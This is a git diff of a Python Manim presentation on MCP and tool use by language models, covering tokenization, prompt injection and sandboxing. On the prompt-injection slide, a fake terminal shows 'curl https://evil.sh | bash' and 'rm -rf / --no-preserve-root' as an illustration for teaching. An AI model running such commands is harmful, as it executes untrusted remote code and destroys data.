@@ -38,6 +38,7 @@ MUTED = SEC
 SUPPORTED_STYLES = set(get_all_styles())
 DEFAULT_STYLE = "monokai"
 
+
 def H(text: str, scale: float = 1.0, color: str = DARK, **kw) -> Text:
     return Text(text, color=color, weight=BOLD, **kw).scale(scale)
 
@@ -126,8 +127,9 @@ class MCPPresentation(Slide):
         self._slide_mcp_adopters()
         self._slide_claude_certification()
         self._slide_mcp_engine()
+        self._slide_why_tools_questions()
         self._slide_why_tools()
-        #self._slide_tokenization_comparison()
+        self._slide_tokenization_comparison()
         self._slide_strawberry()
         self._slide_ai_imo_win()
         self._slide_prompt_injection()
@@ -140,12 +142,12 @@ class MCPPresentation(Slide):
         self._slide_missinformation()
         self._slide_mcp_vs_skills()
         self._slide_mcp_vs_cli()
-        self._slide_wolfram()       
+        self._slide_wolfram()
         self._mcp_websites()
         self._slide_network_protocol()
         self._slide_network_protocol_mcp()
         self._slide_mcp_flow()
-        #animation
+        # animation
         self._slide_connect()
         self._slide_conclusions()
         self._slide_thanks()
@@ -315,6 +317,7 @@ class MCPPresentation(Slide):
 
         self.next_slide()
         self._clear()
+
     # ══════════════════════════════════════════════════════════════════════════
     # SLIDE 4 — MCP as an Engine
     # ══════════════════════════════════════════════════════════════════════════
@@ -382,11 +385,9 @@ class MCPPresentation(Slide):
         self.next_slide()
         self._clear()
 
-
     # ══════════════════════════════════════════════════════════════════════════
     # SLIDE  — MCP adopters
     # ═════════════════════════════════════════════
-
 
     def _slide_mcp_adopters(self):
         anchor = self._header("Who Is Using MCP?")
@@ -424,14 +425,14 @@ class MCPPresentation(Slide):
 
         # ── Company / project data ───────────────────────────────────────────────
         companies = [
-            ("companies/c1.jpg", "GitHub",   "Repos",     CRAIL),
-            ("companies/c2.png", "Canva",    "Desing",     SEC),
-            ("companies/c3.jpg", "Figma",    "Desing",   TERT),
-            ("companies/c4.png", "Blender",  "3D modeling",         CLOUDY),
-            ("companies/c5.png", "Ghidra",   "Reverse\n Engineer",   DARK),
+            ("companies/c1.jpg", "GitHub", "Repos", CRAIL),
+            ("companies/c2.png", "Canva", "Desing", SEC),
+            ("companies/c3.jpg", "Figma", "Desing", TERT),
+            ("companies/c4.png", "Blender", "3D modeling", CLOUDY),
+            ("companies/c5.png", "Ghidra", "Reverse\n Engineer", DARK),
         ]
 
-        IMG_W, IMG_H = 1.0, 1.0   # image bounding box
+        IMG_W, IMG_H = 1.0, 1.0  # image bounding box
         CARD_W, CARD_H = 1.9, 2.4
         CARD_BUFF = 0.28
 
@@ -456,8 +457,8 @@ class MCPPresentation(Slide):
             if logo.get_height() > IMG_H:
                 logo.scale_to_fit_height(IMG_H)
 
-            name_label = B(name,  color=accent, weight=BOLD, scale=0.52)
-            desc_label  = B(desc,  color=DARK,  weight=NORMAL, scale=0.38)
+            name_label = B(name, color=accent, weight=BOLD, scale=0.52)
+            desc_label = B(desc, color=DARK, weight=NORMAL, scale=0.38)
 
             content = Group(logo, name_label, desc_label).arrange(DOWN, buff=0.18)
             content.move_to(bg.get_center())
@@ -487,6 +488,43 @@ class MCPPresentation(Slide):
         self.play(FadeIn(note))
         self.next_slide()
         self._clear()
+
+    def _slide_why_tools_questions(self):
+        anchor = self._header("Why Tools?")
+
+        # ══════════════════════════════════════════════════════════════════════
+        # Three stacked questions, revealed one at a time.
+        # Auto-shrink each line so it never overflows the frame width, no matter
+        # what B()/font ends up being used.
+        # ══════════════════════════════════════════════════════════════════════
+        questions = [
+            "Why do I need to use MCP?",
+            "Why do I need to use tools?",
+            "How do language models work, and why do they need to call external tools?",
+        ]
+
+        max_line_w = 12.6  # safety margin inside default 14.22-wide frame
+        base_scale = 0.62
+        line_gap = 0.85
+
+        lines = VGroup()
+        cursor = anchor.get_bottom() + DOWN * 0.9
+
+        for i, q in enumerate(questions):
+            mob = B(q, scale=base_scale, color=DARK)
+            if mob.width > max_line_w:
+                mob.scale(max_line_w / mob.width)
+            mob.move_to(cursor)
+            lines.add(mob)
+            cursor = cursor + DOWN * line_gap
+
+        # reveal one line at a time
+        for line in lines:
+            self.play(FadeIn(line, shift=UP * 0.15))
+            self.next_slide()
+
+        self._clear()
+
     # ══════════════════════════════════════════════════════════════════════════
     # SLIDE  — Why Tools? + meme
     # ══════════════════════════════════════════════════════════════════════════
@@ -605,30 +643,31 @@ class MCPPresentation(Slide):
         self.next_slide()
         self._clear()
 
-
     def _slide_tokenization_comparison(self):
         # ── header ────────────────────────────────────────────────────────────
         anchor = self._header("Tokenization")
 
-
         # ── intro sentence ────────────────────────────────────────────────────
-        intro = (
-            B("How should we split text before feeding it to a model?", scale=0.52, color=SEC)
-            .next_to(anchor, DOWN, buff=0.35)
-        )
+        intro = B(
+            "How should we split text before feeding it to a model?",
+            scale=0.46,
+            color=SEC,
+        ).next_to(anchor, DOWN, buff=0.30)
         self.play(FadeIn(intro))
         self.next_slide()
 
         # ══════════════════════════════════════════════════════════════════════
         # COLUMN LAYOUT  (3 columns side-by-side)
         # ══════════════════════════════════════════════════════════════════════
-        col_w   = 4.0
-        col_gap = 0.35
-        col_h   = 4.8
-        top_y   = intro.get_bottom()[1] - 0.30
+        # NOTE: default Manim frame is 14.22 wide x 8.0 tall.
+        # 3 cards + 2 gaps must fit comfortably inside that, with margin either side.
+        col_w = 4.15
+        col_gap = 0.30
+        col_h = 5.0
+        top_y = intro.get_bottom()[1] - 0.30
 
         # ── column backgrounds ────────────────────────────────────────────────
-        def card(color: str, label: str, x_center: float) -> VGroup:
+        def card(color: str, label: str, x_center: float):
             bg = RoundedRectangle(
                 corner_radius=0.2,
                 width=col_w,
@@ -640,71 +679,88 @@ class MCPPresentation(Slide):
             ).move_to([x_center, top_y - col_h / 2, 0])
             title = (
                 Text(label, color=color, weight=BOLD)
-                .scale(0.55)
-                .move_to(bg.get_top() + DOWN * 0.38)
+                .scale(0.46)
+                .move_to(bg.get_top() + DOWN * 0.36)
             )
+            # safety: shrink title if it's still wider than the card
+            max_title_w = col_w - 0.4
+            if title.width > max_title_w:
+                title.scale(max_title_w / title.width)
+                title.move_to(bg.get_top() + DOWN * 0.36)
             return VGroup(bg, title), bg, title
 
-        xs = [-col_w - col_gap, 0, col_w + col_gap]
+        xs = [-(col_w + col_gap), 0, (col_w + col_gap)]
 
-        word_card,  word_bg,  word_title  = card(SEC,    "🔤  Word Tokens",      xs[0])
-        char_card,  char_bg,  char_title  = card(CRAIL,  "🔡  Char Tokens",      xs[1])
-        bpe_card,   bpe_bg,   bpe_title   = card("#4A9A6E", "✨  BPE Tokens",     xs[2])
+        word_card, word_bg, word_title = card(SEC, "🔤 Word Tokens", xs[0])
+        char_card, char_bg, char_title = card(CRAIL, "🔡 Char Tokens", xs[1])
+        bpe_card, bpe_bg, bpe_title = card("#4A9A6E", "✨ BPE Tokens", xs[2])
 
-        self.play(
-            FadeIn(word_card),
-            FadeIn(char_card),
-            FadeIn(bpe_card),
-        )
+        self.play(FadeIn(word_card), FadeIn(char_card), FadeIn(bpe_card))
         self.next_slide()
 
         # ══════════════════════════════════════════════════════════════════════
-        # Helper: stack lines inside a column
+        # Helper: stack lines inside a column, auto-shrinking to fit card width
+        # and using a SHARED vertical cursor so rows line up across columns.
         # ══════════════════════════════════════════════════════════════════════
-        def column_content(
-            items: list[tuple[str, str]],   # (text, color)
-            ref_top: np.ndarray,
-            scale: float = 0.44,
-            spacing: float = 0.42,
-        ) -> VGroup:
+        # Fixed row Y-positions shared by all three columns (relative DOWN offset
+        # from each card's top). This guarantees no cross-column overlap.
+        PROS_START = 1.55  # offset from card top to first pros line
+        PROS_GAP = 0.40
+        CONS_START = 2.55  # offset from card top to first cons line (below pros block)
+        CONS_GAP = 0.40
+
+        def column_block(items, bg_top, start_offset, gap, base_scale=0.36):
+            """Lay out `items` (text, color) starting at bg_top + DOWN*start_offset,
+            left-aligned inside the card, auto-shrinking any line that's too wide."""
             group = VGroup()
-            cursor = ref_top + DOWN * 0.72
+            left_x = bg_top[0] - col_w / 2 + 0.25
+            max_w = col_w - 0.5
+            y = bg_top[1] - start_offset
             for text, color in items:
-                mob = Text(text, color=color).scale(scale).move_to(cursor, aligned_edge=LEFT)
-                mob.set_x(ref_top[0] - col_w / 2 + 0.22)
+                mob = Text(text, color=color).scale(base_scale)
+                if mob.width > max_w:
+                    mob.scale(max_w / mob.width)
+                mob.move_to([left_x + mob.width / 2, y, 0])
                 group.add(mob)
-                cursor = cursor + DOWN * spacing
+                y -= gap
             return group
 
         # ── WORD column ───────────────────────────────────────────────────────
-        word_example_label = (
-            B('"love programming"', scale=0.43, color=DARK)
-            .next_to(word_title, DOWN, buff=0.28)
+        word_example_label = B('"love programming"', scale=0.38, color=DARK).next_to(
+            word_title, DOWN, buff=0.24
         )
-        word_tokens = VGroup(
-            pill("love",        SEC, w=2.1, h=0.52),
-            pill("programming", SEC, w=2.5, h=0.52),
-        ).arrange(DOWN, buff=0.14).next_to(word_example_label, DOWN, buff=0.18)
+        if word_example_label.width > col_w - 0.3:
+            word_example_label.scale((col_w - 0.3) / word_example_label.width)
+            word_example_label.next_to(word_title, DOWN, buff=0.24)
 
-        word_pros = column_content(
-            [
-                ("✓  Readable units", "#4A9A6E"),
-                ("✓  Preserves meaning", "#4A9A6E"),
-            ],
-            word_bg.get_top() + DOWN * (0.72 + 1.55),
-            scale=0.40,
-            spacing=0.38,
+        word_tokens = (
+            VGroup(
+                pill("love", SEC, w=1.7, h=0.46),
+                pill("programming", SEC, w=2.3, h=0.46),
+            )
+            .arrange(DOWN, buff=0.20)
+            .next_to(word_example_label, DOWN, buff=0.26)
         )
-        word_cons = column_content(
+
+        word_pros = column_block(
+            [
+                (" ", "#4A9A6E"),
+                (" ", "#4A9A6E"),
+            ],
+            word_bg.get_top(),
+            PROS_START,
+            PROS_GAP,
+        )
+        word_cons = column_block(
             [
                 ("✗  Millions of vocab entries", CRAIL),
                 ('✗  "progrmming" → unknown', CRAIL),
-                ("✗  New slang / names break it", CRAIL),
+                ("✗  New slang/names break it", CRAIL),
                 ("✗  One model per language", CRAIL),
             ],
-            word_bg.get_top() + DOWN * (0.72 + 2.45),
-            scale=0.38,
-            spacing=0.37,
+            word_bg.get_top(),
+            CONS_START,
+            CONS_GAP,
         )
 
         self.play(FadeIn(word_example_label), FadeIn(word_tokens))
@@ -713,33 +769,33 @@ class MCPPresentation(Slide):
         self.next_slide()
 
         # ── CHAR column ───────────────────────────────────────────────────────
-        char_example_label = (
-            B('"love"', scale=0.43, color=DARK)
-            .next_to(char_title, DOWN, buff=0.28)
+        char_example_label = B('"love"', scale=0.38, color=DARK).next_to(
+            char_title, DOWN, buff=0.24
         )
-        char_tokens = VGroup(*[
-            pill(ch, CRAIL, w=0.55, h=0.52) for ch in ["l", "o", "v", "e"]
-        ]).arrange(RIGHT, buff=0.08).next_to(char_example_label, DOWN, buff=0.18)
+        char_tokens = (
+            VGroup(*[pill(ch, CRAIL, w=0.5, h=0.46) for ch in ["l", "o", "v", "e"]])
+            .arrange(RIGHT, buff=0.07)
+            .next_to(char_example_label, DOWN, buff=0.16)
+        )
 
-        char_pros = column_content(
+        char_pros = column_block(
             [
-                ("✓  Tiny vocabulary (~100)", "#4A9A6E"),
-                ("✓  Handles any word", "#4A9A6E"),
+                (" ", "#4A9A6E"),
+                (" ", "#4A9A6E"),
             ],
-            char_bg.get_top() + DOWN * (0.72 + 1.55),
-            scale=0.40,
-            spacing=0.38,
+            char_bg.get_top(),
+            PROS_START,
+            PROS_GAP,
         )
-        char_cons = column_content(
+        char_cons = column_block(
             [
-                ('✗  "programming" = 11 tokens', CRAIL),
                 ("✗  Very long sequences", CRAIL),
                 ("✗  Hard to learn meaning", CRAIL),
                 ("✗  Slow & memory hungry", CRAIL),
             ],
-            char_bg.get_top() + DOWN * (0.72 + 2.45),
-            scale=0.38,
-            spacing=0.37,
+            char_bg.get_top(),
+            CONS_START,
+            CONS_GAP,
         )
 
         self.play(FadeIn(char_example_label), FadeIn(char_tokens))
@@ -750,34 +806,49 @@ class MCPPresentation(Slide):
         # ── BPE column ────────────────────────────────────────────────────────
         GREEN = "#4A9A6E"
 
-        bpe_example_label = (
-            B('"programming"', scale=0.43, color=DARK)
-            .next_to(bpe_title, DOWN, buff=0.28)
+        bpe_example_label = B('"programming"', scale=0.38, color=DARK).next_to(
+            bpe_title, DOWN, buff=0.24
         )
-        bpe_tokens = VGroup(*[
-            pill(tok, GREEN, w=w, h=0.52)
-            for tok, w in [("pro", 0.80), ("gram", 0.92), ("ming", 0.92)]
-        ]).arrange(RIGHT, buff=0.08).next_to(bpe_example_label, DOWN, buff=0.18)
+        if bpe_example_label.width > col_w - 0.3:
+            bpe_example_label.scale((col_w - 0.3) / bpe_example_label.width)
+            bpe_example_label.next_to(bpe_title, DOWN, buff=0.24)
 
-        bpe_pros = column_content(
+        bpe_tokens = (
+            VGroup(
+                *[
+                    pill(tok, GREEN, w=w, h=0.46)
+                    for tok, w in [("pro", 0.70), ("gram", 0.82), ("ming", 0.82)]
+                ]
+            )
+            .arrange(RIGHT, buff=0.07)
+            .next_to(bpe_example_label, DOWN, buff=0.16)
+        )
+        if bpe_tokens.width > col_w - 0.3:
+            bpe_tokens.scale((col_w - 0.3) / bpe_tokens.width)
+            bpe_tokens.next_to(bpe_example_label, DOWN + 0.3, buff=0.16)
+
+        # BPE has 4 pros + 2 cons -> cons must start BELOW the 4-row pros block
+        bpe_pros = column_block(
             [
+                (" ", GREEN),
                 ("✓  Fixed, compact vocab", GREEN),
                 ("✓  Handles new words", GREEN),
                 ("✓  Robust to typos", GREEN),
                 ("✓  Works across languages", GREEN),
             ],
-            bpe_bg.get_top() + DOWN * (0.72 + 1.55),
-            scale=0.40,
-            spacing=0.38,
+            bpe_bg.get_top(),
+            PROS_START,
+            PROS_GAP,
         )
-        bpe_cons = column_content(
+        bpe_cons_start = PROS_START + 4 * PROS_GAP + 0.20  # clear the 4-line pros block
+        bpe_cons = column_block(
             [
-                ("~  Subwords need merging step", SEC),
+                ("~  Subwords need merging", SEC),
                 ("~  Less intuitive than words", SEC),
             ],
-            bpe_bg.get_top() + DOWN * (0.72 + 2.85),
-            scale=0.38,
-            spacing=0.37,
+            bpe_bg.get_top(),
+            bpe_cons_start,
+            CONS_GAP,
         )
 
         # ── highlight the winning column ──────────────────────────────────────
@@ -798,29 +869,33 @@ class MCPPresentation(Slide):
         self.next_slide()
 
         # ── bottom callout ────────────────────────────────────────────────────
+        callout_text_str = (
+            "👉  BPE merges the most frequent character pairs iteratively — "
+            "balancing vocabulary size and sequence length."
+        )
+        callout_txt = B(callout_text_str, scale=0.40, color=DARK)
+
+        # Width budget: keep well inside the 14.22-wide frame with margin.
+        max_callout_w = 12.6
+        if callout_txt.width > max_callout_w:
+            callout_txt.scale(max_callout_w / callout_txt.width)
+
         callout_bg = RoundedRectangle(
             corner_radius=0.15,
-            width=12.8,
-            height=0.72,
+            width=min(max_callout_w, callout_txt.width) + 0.6,
+            height=0.70,
             fill_color=GREEN,
             fill_opacity=0.12,
             stroke_color=GREEN,
             stroke_width=1.5,
         ).to_edge(DOWN, buff=0.22)
 
-        callout_txt = (
-            B(
-                "👉  BPE merges the most frequent pairs of characters iteratively — "
-                "balancing vocabulary size and sequence length.",
-                scale=0.46,
-                color=DARK,
-            )
-            .move_to(callout_bg)
-        )
+        callout_txt.move_to(callout_bg)
 
         self.play(FadeIn(callout_bg), FadeIn(callout_txt))
         self.next_slide()
         self._clear()
+
     # ══════════════════════════════════════════════════════════════════════════
     # SLIDE 7 — Strawberry / tokenisation
     # ══════════════════════════════════════════════════════════════════════════
@@ -876,6 +951,7 @@ class MCPPresentation(Slide):
         self.play(FadeIn(cblock))
         self.next_slide()
         self._clear()
+
     def _slide_ai_imo_win(self):
         anchor = self._header("AI Conquers the Math Olympiad")
 
@@ -884,12 +960,20 @@ class MCPPresentation(Slide):
         row2_data = [("win", TERT), ("  🥇 Gold  ", DARK), ("at IMO 2025", CRAIL)]
 
         row1 = VGroup(
-            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row1_data]
+            *[
+                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66)
+                for w, c in row1_data
+            ]
         ).arrange(RIGHT, buff=0.1)
         row2 = VGroup(
-            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row2_data]
+            *[
+                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66)
+                for w, c in row2_data
+            ]
         ).arrange(RIGHT, buff=0.1)
-        headline = VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
+        headline = (
+            VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
+        )
         headline.set_x(0)
 
         # ── Sub-caption ─────────────────────────────────────────────────────────
@@ -906,9 +990,9 @@ class MCPPresentation(Slide):
         CARD_BUFF = 0.35
 
         cards_data = [
-            ("kaggle_imo.png",  "Kaggle IMO\nChallenge",   CRAIL),
-            ("memes/3.jpeg",          "The News",                SEC),
-            ("memes/happy.png", "Researchers\nright now",  TERT),
+            ("kaggle_imo.png", "Kaggle IMO\nChallenge", CRAIL),
+            ("memes/3.jpeg", "The News", SEC),
+            ("memes/happy.png", "Researchers\nright now", TERT),
         ]
 
         cards = Group()
@@ -922,7 +1006,9 @@ class MCPPresentation(Slide):
                 stroke_color=accent,
                 stroke_width=2.5,
             )
-            img = ImageMobject(img_file).set_resampling_algorithm(RESAMPLING_ALGORITHMS["nearest"])
+            img = ImageMobject(img_file).set_resampling_algorithm(
+                RESAMPLING_ALGORITHMS["nearest"]
+            )
             img.set_width(min(img.get_width(), IMG_MAX))
             if img.get_height() > IMG_MAX:
                 img.scale_to_fit_height(IMG_MAX)
@@ -954,7 +1040,6 @@ class MCPPresentation(Slide):
         self.next_slide()
         self._clear()
 
-
     def _slide_prompt_injection(self):
         anchor = self._header("When AI Goes Wrong: Prompt Injection")
 
@@ -963,20 +1048,28 @@ class MCPPresentation(Slide):
         row2_data = [("the agent", SEC), ("  →  runs", DARK), ("arbitrary code", CRAIL)]
 
         row1 = VGroup(
-            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row1_data]
+            *[
+                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66)
+                for w, c in row1_data
+            ]
         ).arrange(RIGHT, buff=0.1)
         row2 = VGroup(
-            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row2_data]
+            *[
+                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66)
+                for w, c in row2_data
+            ]
         ).arrange(RIGHT, buff=0.1)
-        headline = VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
+        headline = (
+            VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
+        )
         headline.set_x(0)
 
         # ── Terminal block (fake malicious command) ──────────────────────────────
         terminal_lines = [
-            ("$ curl https://evil.sh | bash",          CRAIL),
-            ("Downloading payload... ██████ 100%",      DARK),
+            ("$ curl https://evil.sh | bash", CRAIL),
+            ("Downloading payload... ██████ 100%", DARK),
             ("Executing: rm -rf /  --no-preserve-root", CRAIL),
-            ("ERROR: Catastrophic failure  💥",         SEC),
+            ("ERROR: Catastrophic failure  💥", SEC),
         ]
         terminal_bg = RoundedRectangle(
             corner_radius=0.14,
@@ -1008,7 +1101,9 @@ class MCPPresentation(Slide):
                 stroke_color=accent,
                 stroke_width=2.5,
             )
-            img = ImageMobject(img_file).set_resampling_algorithm(RESAMPLING_ALGORITHMS["nearest"])
+            img = ImageMobject(img_file).set_resampling_algorithm(
+                RESAMPLING_ALGORITHMS["nearest"]
+            )
             img.set_width(min(img.get_width(), 2.8))
             if img.get_height() > MEME_H:
                 img.scale_to_fit_height(MEME_H)
@@ -1017,8 +1112,10 @@ class MCPPresentation(Slide):
             content.move_to(bg.get_center())
             return Group(bg, content)
 
-        meme_card_1 = make_meme_card("memes/surprise.png", "Every dev watching\nthe logs", SEC)
-        meme_card_2 = make_meme_card("memes/2.png",        "The attack in action",         CRAIL)
+        meme_card_1 = make_meme_card(
+            "memes/surprise.png", "Every dev watching\nthe logs", SEC
+        )
+        meme_card_2 = make_meme_card("memes/2.png", "The attack in action", CRAIL)
 
         meme_row = Group(meme_card_1, meme_card_2).arrange(RIGHT, buff=0.4)
         meme_row.next_to(terminal, DOWN, buff=0.45)
@@ -1065,17 +1162,21 @@ class MCPPresentation(Slide):
         self.play(FadeIn(intro, shift=UP * 0.1))
 
         layer_data = [
-            (CRAIL, "Namespaces / cgroups",  "Isolate PID, network, FS "),
-            (CRAIL, "seccomp filter",        "Whitelist safe syscalls, block fork, execve, socket"),
-            (DARK,  "Network = none",        "Network namespace with zero egress, no DNS"),
-            (DARK,  "CPU + Wall limits",     "external watchdog kills runaway processes"),
+            (CRAIL, "Namespaces / cgroups", "Isolate PID, network, FS "),
+            (
+                CRAIL,
+                "seccomp filter",
+                "Whitelist safe syscalls, block fork, execve, socket",
+            ),
+            (DARK, "Network = none", "Network namespace with zero egress, no DNS"),
+            (DARK, "CPU + Wall limits", "external watchdog kills runaway processes"),
         ]
 
-        PILL_X   = -3.8   # horizontal center of all pills
-        PILL_W   =  5.6   # wide enough for longest label
-        PILL_H   =  0.64  # tall enough to breathe
-        DESC_X   =  0.8   # left-edge anchor for descriptions
-        ROW_BUFF =  0.62  # vertical gap — more space between rows
+        PILL_X = -3.8  # horizontal center of all pills
+        PILL_W = 5.6  # wide enough for longest label
+        PILL_H = 0.64  # tall enough to breathe
+        DESC_X = 0.8  # left-edge anchor for descriptions
+        ROW_BUFF = 0.62  # vertical gap — more space between rows
 
         rows = []
         for i, (color, label, desc) in enumerate(layer_data):
@@ -1114,25 +1215,27 @@ class MCPPresentation(Slide):
         anchor = self._header("Arbitrary Code Execution — How Platforms Do It")
 
         # ── platform comparison (top) ─────────────────────────────────────────
-        plat_title = B("Real-world implementations", color=CRAIL, weight=BOLD, scale=0.52)
+        plat_title = B(
+            "Real-world implementations", color=CRAIL, weight=BOLD, scale=0.52
+        )
         plat_title.next_to(anchor, DOWN, buff=0.35)
         plat_title.set_x(0)
 
         platforms = [
             (CRAIL, "Codeforces", "isolate + ptrace syscall allow-list"),
-            (CRAIL, "Replit",     "gVisor (runsc) + Nix per-repl envs"),
-            (DARK,  "AWS Lambda", "Firecracker microVM — ~125 ms boot"),
-            (DARK,  "IOI Judge",  "isolate — open-source, battle-tested"),
+            (CRAIL, "Replit", "gVisor (runsc) + Nix per-repl envs"),
+            (DARK, "AWS Lambda", "Firecracker microVM — ~125 ms boot"),
+            (DARK, "IOI Judge", "isolate — open-source, battle-tested"),
         ]
 
-        NAME_X   = -4.2   # left-anchor for platform names
-        DETAIL_X = -0.01   # left-anchor for detail descriptions
-        ROW_BUFF =  0.48
+        NAME_X = -4.2  # left-anchor for platform names
+        DETAIL_X = -0.01  # left-anchor for detail descriptions
+        ROW_BUFF = 0.48
 
         plat_rows = []
         for i, (color, name, detail) in enumerate(platforms):
-            name_mob   = B(name,   color=color, weight=BOLD, scale=0.50)
-            detail_mob = B(detail, color=SEC,               scale=0.46)
+            name_mob = B(name, color=color, weight=BOLD, scale=0.50)
+            detail_mob = B(detail, color=SEC, scale=0.46)
 
             name_mob.set_x(NAME_X + name_mob.width / 2)
             detail_mob.set_x(DETAIL_X + detail_mob.width / 2)
@@ -1146,7 +1249,9 @@ class MCPPresentation(Slide):
         self.play(
             LaggedStart(
                 *[
-                    AnimationGroup(FadeIn(n, shift=RIGHT * 0.12), FadeIn(d, shift=RIGHT * 0.12))
+                    AnimationGroup(
+                        FadeIn(n, shift=RIGHT * 0.12), FadeIn(d, shift=RIGHT * 0.12)
+                    )
                     for n, d in plat_rows
                 ],
                 lag_ratio=0.22,
@@ -1334,6 +1439,7 @@ class MCPPresentation(Slide):
         self.play(FadeIn(col_invoke))
         self.next_slide()
         self._clear()
+
     def _slide_is_mcp_dead(self):
         anchor = self._header("Is MCP Dead?")
 
@@ -1342,27 +1448,35 @@ class MCPPresentation(Slide):
             ["8.jpg", "9.png"],
         ]
 
-        IMG_W    = 4.8   # width of each image
-        H_GAP    = 0.30  # horizontal gap between columns
-        V_GAP    = 0.25  # vertical gap between rows
+        IMG_W = 4.8  # width of each image
+        H_GAP = 0.30  # horizontal gap between columns
+        V_GAP = 0.25  # vertical gap between rows
 
         grid_mobs = []
         for r, row in enumerate(images_grid):
             for c, path in enumerate(row):
-                if os.path.exists("memes/"+path):
-                    img = ImageMobject("memes/"+path).scale_to_fit_width(IMG_W)
+                if os.path.exists("memes/" + path):
+                    img = ImageMobject("memes/" + path).scale_to_fit_width(IMG_W)
                 else:
                     # fallback placeholder if file missing
                     img = Rectangle(
-                        width=IMG_W, height=IMG_W * 0.6,
-                        fill_color=CLOUDY, fill_opacity=0.2,
-                        stroke_color=CLOUDY, stroke_width=1,
+                        width=IMG_W,
+                        height=IMG_W * 0.6,
+                        fill_color=CLOUDY,
+                        fill_opacity=0.2,
+                        stroke_color=CLOUDY,
+                        stroke_width=1,
                     )
                     lbl = B(path, color=SEC, scale=0.45).move_to(img)
                     img = Group(img, lbl)
 
                 x = (c - 0.5) * (IMG_W + H_GAP)
-                y = anchor.get_bottom()[1] - 0.25 - (IMG_W * 0.6 + V_GAP) * r - (IMG_W * 0.6) / 2
+                y = (
+                    anchor.get_bottom()[1]
+                    - 0.25
+                    - (IMG_W * 0.6 + V_GAP) * r
+                    - (IMG_W * 0.6) / 2
+                )
                 img.set_x(x)
                 img.set_y(y)
                 grid_mobs.append(img)
@@ -1376,6 +1490,7 @@ class MCPPresentation(Slide):
 
         self.next_slide()
         self._clear()
+
     def _slide_missinformation(self):
         anchor = self._header("Внимание! Внимание!")
 
@@ -1392,6 +1507,7 @@ class MCPPresentation(Slide):
 
         self.next_slide()
         self._clear()
+
     # ══════════════════════════════════════════════════════════════════════════
     # SLIDE  — MCP vs CLI vs Skills
     # ══════════════════════════════════════════════════════════════════════════
@@ -1419,7 +1535,7 @@ class MCPPresentation(Slide):
         head_mcp = B("MCP Servers", color=CRAIL, weight=BOLD, scale=0.65).shift(
             RIGHT * 2.2 + UP * 1.5
         )
-        #divline = DashedLine(UP * 1.7, DOWN * 2.7, color=TERT, stroke_width=1.5)
+        # divline = DashedLine(UP * 1.7, DOWN * 2.7, color=TERT, stroke_width=1.5)
 
         skills_mobs = (
             VGroup(*[B(f"—  {p}", color=SEC, scale=0.40) for p in skills_items])
@@ -1453,7 +1569,7 @@ class MCPPresentation(Slide):
         )
         summary_group = VGroup(summary_box, summary).to_edge(DOWN, buff=0.28)
 
-        self.play(FadeIn(head_skills), FadeIn(head_mcp))#, Create(divline))
+        self.play(FadeIn(head_skills), FadeIn(head_mcp))  # , Create(divline))
         self.play(
             LaggedStart(
                 *[FadeIn(m, shift=RIGHT * 0.15) for m in skills_mobs], lag_ratio=0.18
@@ -1466,6 +1582,7 @@ class MCPPresentation(Slide):
         self.play(FadeIn(summary_group, shift=UP * 0.15))
         self.next_slide()
         self._clear()
+
     def _slide_mcp_vs_cli(self):
         anchor = self._header("Problems MCP Solves That CLI Cannot")
 
@@ -1634,27 +1751,38 @@ class MCPPresentation(Slide):
 
         # ── column definitions ─────────────────────────────────────────────────
         COL_LABELS = ["Client", "MCP Server", "LLM", "External\nData Source"]
-        COL_X      = [-5.1, -1.7,  1.7,  5.1]
-        HDR_Y      =  2.30
-        TOP_Y      =  2.00
-        BOT_Y      = -3.40
+        COL_X = [-5.1, -1.7, 1.7, 5.1]
+        HDR_Y = 2.30
+        TOP_Y = 2.00
+        BOT_Y = -3.40
 
         # ── headers ────────────────────────────────────────────────────────────
         headers = []
         for label, x in zip(COL_LABELS, COL_X):
-            box = RoundedRectangle(
-                corner_radius=0.13, width=2.35, height=0.62,
-                fill_color=PAMPAS, fill_opacity=1.0,
-                stroke_color=CRAIL, stroke_width=1.5,
-            ).set_x(x).set_y(HDR_Y)
+            box = (
+                RoundedRectangle(
+                    corner_radius=0.13,
+                    width=2.35,
+                    height=0.62,
+                    fill_color=PAMPAS,
+                    fill_opacity=1.0,
+                    stroke_color=CRAIL,
+                    stroke_width=1.5,
+                )
+                .set_x(x)
+                .set_y(HDR_Y)
+            )
             txt = B(label, color=DARK, weight=BOLD, scale=0.42).move_to(box)
             headers.append(VGroup(box, txt))
 
         # ── lifelines ──────────────────────────────────────────────────────────
         lifelines = [
             DashedLine(
-                [x, TOP_Y, 0], [x, BOT_Y, 0],
-                color=CLOUDY, stroke_width=0.9, dash_length=0.10,
+                [x, TOP_Y, 0],
+                [x, BOT_Y, 0],
+                color=CLOUDY,
+                stroke_width=0.9,
+                dash_length=0.10,
             )
             for x in COL_X
         ]
@@ -1666,24 +1794,24 @@ class MCPPresentation(Slide):
         # ── message definitions ────────────────────────────────────────────────
         # (from_col, to_col, label, is_return, is_internal)
         messages = [
-            (0, 1, "1. Request available tools",       False, False),
-            (1, 0, "2. List of tools",                 True,  False),
-            (0, 2, "3. User query + tools info",        False, False),
-            (2, 0, "4. Instruct: use specific tool",    False, False),
-            (0, 2, "5. Execute tool internally",         False, True ),
-            (1, 3, "6. Request data",                   False, False),
-            (3, 1, "7. Data response",                  True,  False),
-            (1, 0, "8. Retrieved data",                 True,  False),
-            (0, 2, "9. User query + retrieved data",    False, False),
-            (2, 0, "10. Final response",                True,  False),
+            (0, 1, "1. Request available tools", False, False),
+            (1, 0, "2. List of tools", True, False),
+            (0, 2, "3. User query + tools info", False, False),
+            (2, 0, "4. Instruct: use specific tool", False, False),
+            (0, 2, "5. Execute tool internally", False, True),
